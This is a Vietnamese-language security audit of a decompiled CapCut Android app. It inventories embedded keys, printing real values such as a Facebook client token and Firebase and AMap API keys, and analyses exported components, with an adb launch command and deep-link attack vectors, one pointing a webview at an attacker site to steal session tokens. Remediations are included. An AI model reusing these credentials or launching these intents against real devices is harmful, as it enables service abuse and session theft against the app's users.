# BÁO CÁO 05: ĐÁNH GIÁ LỖ HỔNG BẢO MẬT, VÉC-TƠ TẤN CÔNG VÀ TOÀN BỘ KHÓA NHẠY CẢM

> **Mục tiêu đáp ứng**: Yêu cầu 10 (Phân tích các vấn đề bảo mật để tránh/chặn, phân tích hướng tấn công và phương thức khắc phục) & Yêu cầu 12 (Tìm File để đào sâu tiếp, liệt kê mọi key tìm thấy kèm mức độ nhạy cảm).  
> **Tổng số khóa phát hiện**: 66 khóa/định danh được trích xuất từ AndroidManifest, strings.xml, assets và DEX bytecode.  
> **Tập tin dữ liệu đính kèm**: `Report/data/all_discovered_keys.json` & `Report/data/extracted_keys.txt`.

---

## 1. BẢNG TỔNG HỢP TOÀN BỘ KHÓA VÀ MÃ BẢO MẬT (DISCOVERED KEYS INVENTORY)

Các khóa và thông tin nhạy cảm tìm thấy được xếp hạng theo 4 cấp độ:
- 🔴 **MỨC ĐỘ ĐỎ (CRITICAL)**: Khóa bí mật hoặc quyền truy cập có thể bị khai thác trực tiếp để chiếm đoạt tài nguyên, dữ liệu hoặc can thiệp hệ thống.
- 🟠 **MỨC ĐỘ CAM (HIGH)**: API Key của bên thứ ba có thể bị đánh cắp để gọi dịch vụ tốn phí hoặc giả mạo ứng dụng.
- 🟡 **MỨC ĐỘ VÀNG (MEDIUM)**: Thông tin định danh dịch vụ (App ID, Project ID, Web Client ID), hỗ trợ kẻ tấn công lập bản đồ hệ thống.
- 🟢 **MỨC ĐỘ XANH (LOW / PUBLIC)**: Cấu hình công khai, số hiệu phiên bản, cờ tính năng.

| Mức độ | Tên Khóa / Định danh | Giá trị cụ thể tìm thấy | Vị trí phát hiện (Tập tin / Nguồn) | Đánh giá rủi ro & Nguy cơ bị lạm dụng |
|---|---|---|---|---|
| 🔴 **ĐỎ** | `DeveloperActivity` (Active Debug) | Không cần mật khẩu / Không phân quyền | `apktool-res/AndroidManifest.xml`<br>`com.vega.libdeveloper.nativesettings` | Bất kỳ app độc hại nào cài trên máy cũng có thể gọi Intent để mở bảng điều khiển Developer, đổi host server, mock VIP. |
| 🔴 **ĐỎ** | ColorOS Hyper Auth Code | `ATBFAiEAwFmuqCH3yUE2laFVaIX8jtN375owfiFqd2/xAtIs5sYCIDnQV6CyfE5mRFSzMm5QzR7sGHbKiyoa0OsZPOVdPuwUcG7W5GAAAAA=` | `apktool-res/AndroidManifest.xml`<br>`meta-data: com.coloros.ocs.hyper.AUTH_CODE` | Token xác thực phần cứng độc quyền ColorOS (OPPO/Realme) để tăng tốc GPU/NPU. Nếu bị leak có thể bị dùng trái phép trong app khác. |
| 🟠 **CAM** | Facebook Client Token | `4070ba40e8152d8816e3c393a11adc0c` | `apktool-res/res/values/strings.xml`<br>`APKTOOL_RENAMED_0x7f121276` | Dùng để xác thực ứng dụng với Graph API của Facebook. Kẻ tấn công có thể giả mạo CapCut để thực hiện các truy vấn Graph API. |
| 🟠 **CAM** | Google Firebase API Key | `AIzaSyAu7yokhdezQ1WZBsDuH3epz3pm-kB7dE0` | `apktool-res/res/values/strings.xml`<br>`google_api_key` & `google_crash_reporting_api_key` | Khóa API dịch vụ đám mây Google. Nếu Firebase Security Rules cấu hình lỏng lẻo, kẻ tấn công có thể truy vấn Firestore/Storage. |
| 🟠 **CAM** | AutoNavi (AMap) API Key | `c2f1e56b87f257275fbf44a1fc067e0b` | `apktool-res/AndroidManifest.xml`<br>`meta-data: com.amap.api.v2.apikey` | Khóa dịch vụ bản đồ AMap. Kẻ xấu có thể trích xuất để gọi dịch vụ định vị tốn quota của chủ sở hữu. |
| 🟡 **VÀNG** | Facebook Application ID | `163543514909045` | `apktool-res/res/values/strings.xml`<br>`APKTOOL_RENAMED_0x7f121275` | Định danh ứng dụng Facebook SDK của CapCut Global. |
| 🟡 **VÀNG** | Google AdMob App ID | `ca-app-pub-8563181921274308~3003233985` | `apktool-res/AndroidManifest.xml`<br>`meta-data: com.google.android.gms.ads.APPLICATION_ID` | Định danh tài khoản kiếm tiền AdMob của ByteDance/Lemon Inc. |
| 🟡 **VÀNG** | Firebase Project ID | `jianying-global` | `apktool-res/res/values/strings.xml`<br>`project_id` | Tên dự án Firebase nội bộ của ByteDance (`jianying-global`). |
| 🟡 **VÀNG** | Firebase Database URL | `https://jianying-global.firebaseio.com` | `apktool-res/res/values/strings.xml`<br>`firebase_database_url` | Đường dẫn máy chủ Realtime Database. |
| 🟡 **VÀNG** | Google OAuth Web Client ID | `215226865820-v3erqjr22mev4ptsg50u76cpp7psod8o.apps.googleusercontent.com` | `apktool-res/res/values/strings.xml`<br>`default_web_client_id` | OAuth 2.0 Client ID xác thực đăng nhập Google. |
| 🟡 **VÀNG** | Google GCM Sender ID | `215226865820` | `apktool-res/res/values/strings.xml`<br>`gcm_defaultSenderId` | Định danh dự án nhận thông báo đẩy FCM. |
| 🟡 **VÀNG** | ByteDance Internal App ID | `aid = 713534` | `extracted/classes2.dex`<br>`AppLog / BuildConfig` | Mã định danh dịch vụ nội bộ của CapCut trên hệ sinh thái máy chủ ByteDance. |
| 🟢 **XANH** | Phiên bản SS_VERSION_CODE | `19400300` (v19.4.0) | `apktool-res/AndroidManifest.xml` | Thông số build release. |

---

## 2. PHÂN TÍCH CÁC LỖ HỔNG BẢO MẬT TRỌNG YẾU (VULNERABILITY ANALYSIS)

### Lỗ hổng 1: Màn hình Cài đặt Nhà phát triển (DeveloperActivity) bị xuất khẩu công khai (CWE-489)
- **Mô tả**: Trong `apktool-res/AndroidManifest.xml`:
  ```xml
  <activity android:name="com.vega.libdeveloper.nativesettings.DeveloperActivity" android:exported="true"/>
  ```
  Thành phần này được đặt `android:exported="true"` nhưng hoàn toàn **không có bất kỳ `android:permission` nào** để bảo vệ!
- **Phương thức tấn công**: Bất kỳ ứng dụng nào khác trên cùng thiết bị (kể cả malware không cần quyền) hoặc qua lệnh ADB:
  ```bash
  adb shell am start -n com.lemon.lvoverseas/com.vega.libdeveloper.nativesettings.DeveloperActivity
  ```
- **Hậu quả**: Kẻ tấn công mở trực tiếp trang cấu hình kỹ thuật `DeveloperConfigPage`, cho phép:
  1. Chuyển đổi môi trường server sang Sandbox / BOE nội bộ của ByteDance.
  2. Kích hoạt cờ giả lập trạng thái đã mua VIP (`mock_vip = true`).
  3. Bật chế độ dump log, can thiệp luồng tải mã dynamic bytecode.
- **Phương thức khắc phục**: Đặt `android:exported="false"` đối với các màn hình debug trong bản build Release, hoặc dùng Proguard loại bỏ hoàn toàn package `com.vega.libdeveloper` khỏi bản phát hành.

---

### Lỗ hổng 2: Hoạt động thanh toán PIPO Wallet Dispatcher bị Export công khai (CWE-926)
- **Mô tả**:
  ```xml
  <activity android:name="com.bytedance.pipo.common.ability.wallet.PIPOWalletDispatcherActivity" android:exported="true">
      <intent-filter>
          <action android:name="android.intent.action.VIEW"/>
          <category android:name="android.intent.category.DEFAULT"/>
          <category android:name="android.intent.category.BROWSABLE"/>
          <data android:scheme="pipohybridsdk3006" android:host="pipopay"/>
      </intent-filter>
  </activity>
  ```
- **Véc-tơ tấn công**: Trang web lừa đảo hoặc ứng dụng ngoài có thể kích hoạt scheme:
  `pipohybridsdk3006://pipopay?params=...`
  nhằm tiêm dữ liệu giả mạo vào luồng điều phối thanh toán PIPO của ByteDance.
- **Phương thức khắc phục**: Thêm cơ chế kiểm tra `getCallingPackage()` hoặc xác thực chữ ký của caller trước khi điều phối lệnh thanh toán.

---

### Lỗ hổng 3: Nguy cơ chiếm quyền điều khiển luồng qua Deep Link tùy tiện (CWE-939)
- **Mô tả**: `DeeplinkActivity` tiếp nhận các URI `capcut://` và `capcut1380://` mà không có danh sách trắng (whitelist) nghiêm ngặt đối với tham số chuyển hướng web:
  ```
  capcut://webview?url=http://attacker-site.com
  ```
- **Véc-tơ tấn công**: Nếu WebView nhúng có bật JavaScript Bridge (`LynxMsgCenter` hoặc `addJavascriptInterface`), kẻ tấn công có thể điều hướng webview đến trang chứa mã độc và gọi các hàm native của ứng dụng để trích xuất token người dùng (`sessionid`).
- **Phương thức khắc phục**: Bắt buộc kiểm tra domain trong URL đích bằng Regex nghiêm ngặt (`^https:\/\/[a-zA-Z0-9.-]+\.(capcutapi\.com|capcut\.com|tiktok\.com)\/`), từ chối mọi URL không nằm trong danh sách an toàn.

---

### Lỗ hổng 4: Đồng bộ tài khoản qua AccountSyncService không có Permission bảo vệ
- **Mô tả**: Hàng loạt Service và Provider của hệ thống đồng bộ đẩy thông báo:
  - `com.bytedance.android.push.depths.i18n.account.smp.SmpDepthsI18nAccountSyncService`
  - `com.bytedance.android.push.depths.i18n.account.push.PushDepthsI18nAccountStubProvider`
  đều bị xuất khẩu (`exported="true"`) mà không có `android:permission`.
- **Hậu quả**: Ứng dụng độc hại có thể kích hoạt chu kỳ đồng bộ dữ liệu liên tục gây tiêu hao pin, nghẽn mạng thiết bị (DoS cục bộ).

---

## 3. CÁC TẬP TIN CẦN TIẾP TỤC ĐÀO SÂU (DEEP-DIVE TARGETS)

Dành cho các chuyên gia phân tích muốn dịch ngược sâu hơn các thuật toán giải mã và chữ ký:

1. **`extracted/lib/arm64-v8a/libmiddle-bridge.so`**:
   - Chứa logic lõi của Video Engine, mã hóa cấu trúc Timeline, và hàm băm xác thực tính toàn vẹn của dự án.
2. **`extracted/lib/arm64-v8a/libsscronet.so`**:
   - Chứa thuật toán sinh chữ ký `X-Gorgon`, `X-Khronos`, `X-Argus` và bảng mã băm (S-Box) chống cào dữ liệu API.
3. **`extracted/assets/offline/`**:
   - 476 tập tin JavaScript và Lynx Bundle (`template.js`) quy định giao diện và logic tương tác của tính năng tìm kiếm và hiển thị mẫu.
4. **`extracted/classes17.dex`**:
   - Chứa toàn bộ phân hệ AI Agent (`com.vega.ailabagent` và `com.vega.kmp.agent.core`).
5. **`extracted/classes14.dex`**:
   - Chứa phân hệ thương mại và Paywall (`com.lemon.clipmonetize.biz.commerce_page.lv_oversea`).
